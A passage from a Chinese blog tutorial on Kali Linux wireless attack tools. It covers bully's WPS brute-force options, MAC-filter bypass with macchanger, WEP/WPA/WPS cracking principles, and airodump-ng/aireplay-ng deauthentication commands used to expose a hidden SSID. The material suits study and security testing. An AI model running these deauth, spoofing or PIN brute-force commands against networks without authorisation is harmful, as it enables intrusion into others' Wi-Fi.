every Nth nack at M7 [5,1]</span><br><span class="line">  -A, --noacks           : Disable ACK check for sent packets    [No]</span><br><span class="line">  -C, --nocheck          : Skip CRC/FCS validation (performance) [No]</span><br><span class="line">  -D, --detectlock       : Detect WPS lockouts unreported by AP  [No]</span><br><span class="line">  -E, --eapfail          : EAP Failure terminate every exchange  [No]</span><br><span class="line">  -L, --lockignore       : Ignore WPS locks reported by the AP   [No]</span><br><span class="line">  -M, --m57nack          : M5/M7 timeouts treated as WSC_NACK&apos;s  [No]</span><br><span class="line">  -N, --nofcs            : Packets don&apos;t contain the FCS field [Auto]</span><br><span class="line">  -P, --probe            : Use probe request for nonbeaconing AP [No]</span><br><span class="line">  -Q, --wpsinfo          : Use probe request to gather WPS info  [No]</span><br><span class="line">  -R, --radiotap         : Assume radiotap headers are present [Auto]</span><br><span class="line">  -W, --windows7         : Masquerade as a Windows 7 registrar   [No]</span><br><span class="line">  -Z, --suppress         : Suppress packet throttling algorithm  [No]</span><br><span class="line">  -V, --version          : Print version info and exit</span><br><span class="line">  -h, --help             : Display this help information</span><br></pre></td></tr></table></figure>
+<h5 id="参数详细介绍"><a href="#参数详细介绍" class="headerlink" title="参数详细介绍"></a>参数详细介绍</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"> -c, --channel N[,N...]</span><br><span class="line"></span><br><span class="line">Channel number, or comma separated list of channels to hop on. Some AP&apos;s will switch</span><br><span class="line">channels periodically. This option allows bully to reacquire an AP and continue an attack</span><br><span class="line">without intervention. Note that using channel hopping will typically slow an attack,</span><br><span class="line">especially when the AP&apos;s signal is weak, because time is spent scanning channels instead</span><br><span class="line">of testing pins. If no channel is provided, bully will hop on all channels.</span><br><span class="line"></span><br><span class="line"> -i, --index N</span><br><span class="line"></span><br><span class="line">This is the index of the starting pin number in the randomized pin file. This option is</span><br><span class="line">not valid when running bully in sequential pin search mode.  This is typically handled</span><br><span class="line">for you automatically, i.e. an interrupted session will resume after the last pin that</span><br><span class="line">was successfully tested. Note that when less than 7 digits (8 digits if -B is active) are</span><br><span class="line">given, zeroes are padded on the left.</span><br><span class="line"></span><br><span class="line"> -l, --lockwait N</span><br><span class="line"></span><br><span class="line">Number of seconds to wait when an AP locks WPS. Most AP&apos;s will lock out for 5 minutes, so</span><br><span class="line">the default value is 43 seconds. This will cause bully to sleep 7 times during a lockout</span><br><span class="line">period for a total of 301 seconds.</span><br><span class="line"></span><br><span class="line"> -o, --output file</span><br><span class="line"></span><br><span class="line">By default, messages are printed to the standard output. Use this option to send output </span><br><span class="line">to the specified file instead.</span><br><span class="line"></span><br><span class="line"> -p, --pin N</span><br><span class="line"></span><br><span class="line">This is the starting pin number. Use of this option results in a sequential pin search</span><br><span class="line">starting at the given pin. This is typically handled for you automatically, i.e. an</span><br><span class="line">interrupted session will resume after the last pin that was successfully tested. Note</span><br><span class="line">that when less than 7 digits (8 digits if -B is active) are given, zeroes are padded on</span><br><span class="line">the left.</span><br><span class="line"></span><br><span class="line"> -s, --source macaddr</span><br><span class="line"></span><br><span class="line">The source MAC address to embed in packets sent to the AP. Not all wireless cards can be</span><br><span class="line">used to spoof the source MAC address like this, but the option is provided for chipsets</span><br><span class="line">that allow it. When not provided, the wireless interface is probed to retrieve the MAC.</span><br><span class="line"></span><br><span class="line"> -v, --verbosity N</span><br><span class="line"></span><br><span class="line">Verbosity level. 1 is the quietest, displaying only unrecoverable error information. Level</span><br><span class="line">3 displays the most information, and is best used to determine exactly what is happening</span><br><span class="line">during a session.</span><br><span class="line"></span><br><span class="line"> -w, --workdir path</span><br><span class="line"></span><br><span class="line">Working directory, where randomized pins and session files are stored. Session files are</span><br><span class="line">created in this directory based on the BSSID of the access point. Only one set of randomized</span><br><span class="line">pins is created, and is used for all sessions. If you want to regenerate the pin file, simply</span><br><span class="line">delete it from this directory; however incomplete runs that used the deleted file will not</span><br><span class="line">be restartable. The default directory is ~/.bully/</span><br><span class="line"></span><br><span class="line"> -5, --5ghz</span><br><span class="line"></span><br><span class="line">Use 5 GHz (a/n) channels instead of 2.54 GHz (b/g) channels. Untested.</span><br><span class="line"></span><br><span class="line"> -B, --bruteforce</span><br><span class="line"></span><br><span class="line">Bruteforce the WPS pin checksum digit rather than calculating it according to the WPS</span><br><span class="line">specification. Some AP&apos;s use a non-compliant checksum in an attempt to evade attacks from</span><br><span class="line">compliant software. Use of this option can result in a ten-fold increase in the time it</span><br><span class="line">takes to discover the second portion of the pin, and should only be used when necessary.</span><br><span class="line"></span><br><span class="line"> -F, --force</span><br><span class="line"></span><br><span class="line">In certain scenarios bully will print a warning message and exit. This typically indicates that</span><br><span class="line">it is being used in a manner that is questionable for most users. Advanced users and developers</span><br><span class="line">can force continuance with this option.</span><br><span class="line"></span><br><span class="line"> -S, --sequential</span><br><span class="line"></span><br><span class="line">By default, pins are randomized. This options allows pins to be tested sequentially.</span><br><span class="line"></span><br><span class="line"> -T, --test</span><br><span class="line"></span><br><span class="line">Test mode. No packets are injected. Can be used to validate arguments, determine if an</span><br><span class="line">access point is visible and has WPS enabled, generate a randomized pin file, or create a</span><br><span class="line">session file for the access point.</span><br><span class="line"></span><br><span class="line"> -d, --pixiewps</span><br><span class="line"> </span><br><span class="line">           The -d option performs an offline attack, Pixie Dust (pixiewps),</span><br><span class="line">by automatically passing the PKE, PKR, E-Hash1, E-Hash2, E-Nonce and Authkey.</span><br><span class="line">pixiewps will then try to attack Ralink, Broadcom and Realtek chipsets.</span><br><span class="line"></span><br><span class="line"> -g, --genpin N</span><br><span class="line"> </span><br><span class="line">           This is a pin generator for either [1] D-Link or [2] Belkin</span><br><span class="line">routers which uses a known vulnerability names &quot;pingen attack&quot;.</span><br><span class="line"></span><br><span class="line"> -a, --acktime N</span><br><span class="line"></span><br><span class="line">Deprecated. Packet timings are throttled automatically. Will be removed in future revision.</span><br><span class="line"></span><br><span class="line"> -r, --retries N</span><br><span class="line"></span><br><span class="line">How many times do we resend packets when they aren&apos;t acknowledged? Default is 3. The idea is to</span><br><span class="line">make a best effort to ensure the AP receives every packet we send, rather than have transactions</span><br><span class="line">fail and restart due to a missed packet.</span><br><span class="line"></span><br><span class="line"> -m, --m13time N</span><br><span class="line"></span><br><span class="line">Deprecated. Packet timings are throttled automatically. Will be removed in future revision.</span><br><span class="line"></span><br><span class="line"> -t, --timeout N</span><br><span class="line"></span><br><span class="line">Deprecated. Packet timings are throttled automatically. Will be removed in future revision.</span><br><span class="line"></span><br><span class="line"> -1, --pin1delay M[,N]</span><br><span class="line"></span><br><span class="line">Delay M seconds for every Nth NACK at M5. The default is 0,1 (no delay). Some access points</span><br><span class="line">get overwhelmed by too many successive WPS transactions, and can even crash if we don&apos;t dial</span><br><span class="line">things back a bit. This is the delay period to use during the first half of the pin.</span><br><span class="line"></span><br><span class="line"> -2, --pin2delay M[,N]</span><br><span class="line"></span><br><span class="line">Delay M seconds for every Nth NACK at M7. The default is 0,1 (no delay). Some access points</span><br><span class="line">handle transactions through M4 easily, only to fall down on too many successive M6 messages.</span><br><span class="line">This is the delay period to use during the second half of the pin.</span><br><span class="line"></span><br><span class="line"> -A, --noacks</span><br><span class="line"></span><br><span class="line">Turn off acknowledgement processing for all sent packets. Useful if you are sure the AP is</span><br><span class="line">receiving packets even though bully can&apos;t see acknowledgements. You might need this for a USB</span><br><span class="line">wifi adapter that processes acknowledgements and drops them before libpcap ever sees them.</span><br><span class="line"></span><br><span class="line"> -C, --nocheck</span><br><span class="line"></span><br><span class="line">Turn off frame check sequence processing. We can improve performance somewhat by making the</span><br><span class="line">dubious assumption that all packets we receive are valid. See also --nofcs below.</span><br><span class="line"></span><br><span class="line"> -D, --detectlock</span><br><span class="line"></span><br><span class="line">Certain access points do not indicate that they have locked WPS in their beacon IE tags, but</span><br><span class="line">summarily ignore all WPS transactions for a period of time. With this option, we can detect the</span><br><span class="line">condition and sleep for --lockdelay seconds before resuming. In the interests of remaining</span><br><span class="line">undetected, there is no point in broadcasting 5 minutes worth of unanswered EAP START messages.</span><br><span class="line"></span><br><span class="line"> -E, --eapfail</span><br><span class="line"></span><br><span class="line">Send EAP FAIL messages after each transaction. Some AP&apos;s get confused when they don&apos;t see this.</span><br><span class="line"></span><br><span class="line"> -L, --lockignore</span><br><span class="line"></span><br><span class="line">Ignore WPS lock conditions reported in beacon information elements (don&apos;t sleep).</span><br><span class="line"></span><br><span class="line"> -M, --m57nack</span><br><span class="line"></span><br><span class="line">Treat M5 and M7 timeouts as NACK&apos;s, for those access points that don&apos;t send them but instead</span><br><span class="line">drop the transaction. When using this option you will probably want to increase the --timeout </span><br><span class="line">value, so that bully doesn&apos;t incorrectly assume a pin is incorrect due to a delayed message.</span><br><span class="line"></span><br><span class="line"> -N, --nofcs</span><br><span class="line"></span><br><span class="line">Some wireless hardware will have done the work of checking and stripping the FCS from packets</span><br><span class="line">already. Bully usually detects this and adjusts accordingly, but the option is here if you need</span><br><span class="line">to force it.</span><br><span class="line"></span><br><span class="line"> -P, --probe</span><br><span class="line"></span><br><span class="line">Bully uses beacons to examine the WPS state of an access point. For nonbeaconing AP&apos;s, send</span><br><span class="line">directed probe requests and use the resulting probe responses instead. Requires --essid.</span><br><span class="line"></span><br><span class="line"> -Q, --wpsinfo</span><br><span class="line"></span><br><span class="line">Gather WPS info by using probe request(s) against a target.</span><br><span class="line">May reveal chipset manufacturer, WPS version and other geeky stats.</span><br><span class="line"></span><br><span class="line"> -R, --radiotap</span><br><span class="line"></span><br><span class="line">Assume radiotap headers are present in received packets. This is useful in cases where presence</span><br><span class="line">of radiotap headers is incorrectly reported or detected.</span><br><span class="line"></span><br><span class="line"> -Z, --suppress</span><br><span class="line"></span><br><span class="line">Suppress automatic timimg algorithm and instead use default timings for received packets. NOT</span><br><span class="line">RECOMMENDED.</span><br><span class="line"></span><br><span class="line"> -W, --windows7</span><br><span class="line"></span><br><span class="line">Masquerade as a Windows 7 registrar.</span><br><span class="line"></span><br><span class="line"> -V, --version</span><br><span class="line"></span><br><span class="line">Print version information to standard output and exit.</span><br><span class="line"></span><br><span class="line"> -h, --help</span><br><span class="line"></span><br><span class="line">Display onscreen help.</span><br></pre></td></tr></table></figure>
+<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><h5 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h5><p>管理员误以为MAC绑定是一种安全机制，能够限制可以关联的客户端MAC地址。<br>准备AP：<br>1、AP基本配置<br>2、Open认证<br>3、开启无线过滤<br>修改MAC地址绕过过滤：<br>别人做了白名单mac绑定，这样的话，侦听这个BSSID，查看哪一个STA的MAC已经连上，复制这个已经连上的STA的MAC，把这个MAC地址复制到自己的无线网卡的MAC上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0 down</span><br><span class="line">macchanger -m 接MAC地址 接网卡</span><br><span class="line">ifconfig wlan0 up</span><br></pre></td></tr></table></figure></p>
+<p>再去连接，就可以连接上了。——&gt;双方存在的话会丢包，信号不好（除非只有一个存在）</p>
+<h5 id="WEP密码破解原理"><a href="#WEP密码破解原理" class="headerlink" title="WEP密码破解原理"></a>WEP密码破解原理</h5><h6 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h6><p>1、IV并非完全随机<br>2、每224个包可能出现一次IV重用<br>3、收集大量IV之后找出相同IV及其对应密文，分析得出共享密码<br>ARP回包中包含IV<br>只要在IV足够多的情况下，任何复杂程度的WEP密码都可以被破解（IV量破解和暴力破解）</p>
+<h6 id="FAKE-AUTHENTICATION"><a href="#FAKE-AUTHENTICATION" class="headerlink" title="FAKE AUTHENTICATION"></a>FAKE AUTHENTICATION</h6><p>伪造认证，以便与AP进行正常通信</p>
+<h6 id="ARP重放"><a href="#ARP重放" class="headerlink" title="ARP重放"></a>ARP重放</h6><p>侦听正常的ARP包并重放给AP<br>AP回包中包含大量弱IV——&gt;重复出现</p>
+<h5 id="WPA攻击"><a href="#WPA攻击" class="headerlink" title="WPA攻击"></a>WPA攻击</h5><h6 id="DEAUTHENTICATION"><a href="#DEAUTHENTICATION" class="headerlink" title="DEAUTHENTICATION"></a>DEAUTHENTICATION</h6><p>强制客户端与AP断开关联<br>重连生成ARP请求，AP回包包含IV<br>WPA重连过程，过程抓取4步握手过程,保存到本地cap文件中。<br>无客户端情况下此攻击无效<br>暴力破解条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、CPU资源</span><br><span class="line">2、时间</span><br><span class="line">3、字典质量：</span><br><span class="line">	网上共享的字典</span><br><span class="line">	泄露密码(an Internet)</span><br><span class="line">	地区电话号码段</span><br><span class="line">	Crunch生成字典</span><br><span class="line">	kali中自带的字典 ——&gt;有些密码不符合要求，会自动过滤</span><br></pre></td></tr></table></figure></p>
+<h5 id="WPS攻击"><a href="#WPS攻击" class="headerlink" title="WPS攻击"></a>WPS攻击</h5><ul>
+<li>WPS是WiFi联盟2006年开发的一项技术<br>  通过PIN码来简化无线接入的操作，无需记住PSK<br>  路由器和网卡各按一个按钮就能接入无线<br>  PIN码是分为前后各4位的2段共8位数字</li>
+<li>安全漏洞<br>  2011年被发现安全涉及漏洞<br>  接入发起方可以根据路由器的返回信息判断前4位是否正确<br>  而PIN码的后4位只有1000种定义的组合（最后一位是checksum）<br>  所以全部穷举破解只需要11000次尝试<pre><code>PSK：218340105584896种可能
+</code></pre>  标准本身没有设计锁定机制，目前多个厂商已实现锁定机制<br>//都要支持WPS功能，初衷是：物理连接，物理确认（通过按钮  ）。<br>//AP要是支持WPS的话，只要尝试最多11000次找出PIN码，就会被破解。<br>——&gt;因为有限制，所以设置攻击方式、次数等</li>
+<li>用计算器直接算出PIN<br>  C83A35、00B00C——&gt;很少见<br>//它直接找出PIN码，最多11000次；找出后计算出key，肯定能算出，不像WPA要字典。</li>
+</ul>
+<h5 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h5><p>隐藏SSID防止破解有用么？<br>隐藏SSID就是把你wifi的AP隐藏起来，不让别人搜索到。请注意，这样的话，在连接wifi时就要手动输入AP名。<br><img data-src="https://img-blog.csdnimg.cn/20200324185847312.png" alt="在这里插入图片描述"><br>只看到了 length 12，没有ap名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon</span><br><span class="line">aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br></pre></td></tr></table></figure></p>
+<p>破解密码的方法不变；使用上面两个命令就可以轻松得到ap名。</p>
+<p>事实证明，隐藏SSID并不管啥事；其实设置一个复杂的密码比隐藏SSID要管用的多。</p>
+<p>本文同步更新至个人博客：<a href="https://xchcloud.cn">罗小黑零食铺</a><br>如果个人博客打不开就是维护升级中～</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>喜欢这篇文章？打赏一下作者吧！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="超超 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="超超 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>超超
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://xchcloud.cn/kali-linux工具简介/" title="kali-linux工具简介">http://xchcloud.cn/kali-linux工具简介/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+              <a href="/tags/kali/" rel="tag"><i class="fa fa-tag"></i> kali</a>
+              <a href="/tags/无线安全/" rel="tag"><i class="fa fa-tag"></i> 无线安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Python多线程/" rel="prev" title="Python多线程">
+      <i class="fa fa-chevron-left"></i> Python多线程
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/网络协议-HTTP缓存/" rel="next" title="网络协议-HTTP缓存">
+      网络协议-HTTP缓存 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="SOHUCS"></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#工具集合"><span class="nav-text">工具集合</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#无线攻击篇"><span class="nav-text">无线攻击篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#蓝牙工具集合"><span class="nav-text">蓝牙工具集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无线工具集合"><span class="nav-text">无线工具集合</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#iwconfig"><span class="nav-text">iwconfig</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参数说明"><span class="nav-text">参数说明</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Aircrack-ng"><span class="nav-text">Aircrack-ng</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参数说明-1"><span class="nav-text">参数说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用说明"><span class="nav-text">使用说明</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#DEAUTHENTICATION攻击"><span class="nav-text">DEAUTHENTICATION攻击</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其他使用说明"><span class="nav-text">其他使用说明</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-fakeauth-count-伪装一个客户端和ap进行连接"><span class="nav-text">-1 fakeauth count 伪装一个客户端和ap进行连接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-interactive-交互模式"><span class="nav-text">-2 interactive 交互模式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-arp-request注入攻击模式"><span class="nav-text">-3 arp-request注入攻击模式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-chopchop攻击模式，用来获得一个包含密钥数据的xor文件"><span class="nav-text">-4 chopchop攻击模式，用来获得一个包含密钥数据的xor文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-fragment-碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）"><span class="nav-text">-5 fragment 碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kismet"><span class="nav-text">Kismet</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参数说明-2"><span class="nav-text">参数说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用说明-1"><span class="nav-text">使用说明</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1、初始化"><span class="nav-text">1、初始化</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2、过程说明"><span class="nav-text">2、过程说明</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3、捕获的信息查阅"><span class="nav-text">3、捕获的信息查阅</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wifite"><span class="nav-text">wifite</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pixiewps"><span class="nav-text">pixiewps</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参数说明-3"><span class="nav-text">参数说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#简介"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用说明-2"><span class="nav-text">使用说明</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reaver"><span class="nav-text">reaver</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参数说明-4"><span class="nav-text">参数说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用说明-3"><span class="nav-text">使用说明</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bully"><span class="nav-text">bully</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#说明"><span class="nav-text">说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参数说明-5"><span class="nav-text">参数说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参数详细介绍"><span class="nav-text">参数详细介绍</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析"><span class="nav-text">原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MAC地址绑定攻击"><span class="nav-text">MAC地址绑定攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WEP密码破解原理"><span class="nav-text">WEP密码破解原理</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#WEP共享密钥破解"><span class="nav-text">WEP共享密钥破解</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#FAKE-AUTHENTICATION"><span class="nav-text">FAKE AUTHENTICATION</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ARP重放"><span class="nav-text">ARP重放</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WPA攻击"><span class="nav-text">WPA攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#DEAUTHENTICATION"><span class="nav-text">DEAUTHENTICATION</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WPS攻击"><span class="nav-text">WPS攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#小实验"><span class="nav-text">小实验</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="超超"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">超超</p>
+  <div class="site-description" itemprop="description">那天早上雾散了，不止早上、不止雾。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">139</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">53</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">118</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
